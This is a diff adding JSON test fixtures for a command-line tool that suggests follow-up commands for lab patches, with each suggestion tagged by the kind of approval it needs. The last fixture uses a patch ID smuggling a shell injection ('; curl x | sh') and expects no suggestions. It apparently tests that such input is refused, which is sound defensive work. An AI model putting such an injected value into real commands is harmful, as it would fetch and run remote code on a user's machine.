@@ -218,6 +218,88 @@
    "kind": "snapshot",
    "name": "Name",
    "expect": []
+  },
+  {
+   "kind": "patch",
+   "name": "opdesk",
+   "item": {
+    "patch_id": "lpt_0123456789abcdef",
+    "lab": "emporia",
+    "check": null
+   },
+   "expect": [
+    {
+     "label": "check it in the sandbox",
+     "command": "hermes emporia lab opdesk check emporia --patch lpt_0123456789abcdef",
+     "gate": "person"
+    },
+    {
+     "label": "read the lab's patches",
+     "command": "hermes emporia lab opdesk show emporia",
+     "gate": "read"
+    }
+   ]
+  },
+  {
+   "kind": "patch",
+   "name": "opdesk",
+   "item": {
+    "patch_id": "lpt_0123456789abcdef",
+    "lab": "emporia",
+    "check": {
+     "verdict": "pass"
+    }
+   },
+   "expect": [
+    {
+     "label": "land it in your checkout (a new branch; nothing is pushed)",
+     "command": "hermes emporia lab opdesk land lpt_0123456789abcdef --into CHECKOUT",
+     "gate": "person"
+    },
+    {
+     "label": "check it again",
+     "command": "hermes emporia lab opdesk check emporia --patch lpt_0123456789abcdef",
+     "gate": "person"
+    },
+    {
+     "label": "read the lab's patches",
+     "command": "hermes emporia lab opdesk show emporia",
+     "gate": "read"
+    }
+   ]
+  },
+  {
+   "kind": "patch",
+   "name": "opdesk",
+   "item": {
+    "patch_id": "lpt_aa",
+    "lab": "emporia",
+    "check": {
+     "verdict": "fail"
+    }
+   },
+   "expect": [
+    {
+     "label": "check it again",
+     "command": "hermes emporia lab opdesk check emporia --patch lpt_aa",
+     "gate": "person"
+    },
+    {
+     "label": "read the lab's patches",
+     "command": "hermes emporia lab opdesk show emporia",
+     "gate": "read"
+    }
+   ]
+  },
+  {
+   "kind": "patch",
+   "name": "opdesk",
+   "item": {
+    "patch_id": "lpt_1; curl x | sh",
+    "lab": "emporia",
+    "check": null
+   },
+   "expect": []
   }
  ]
 }
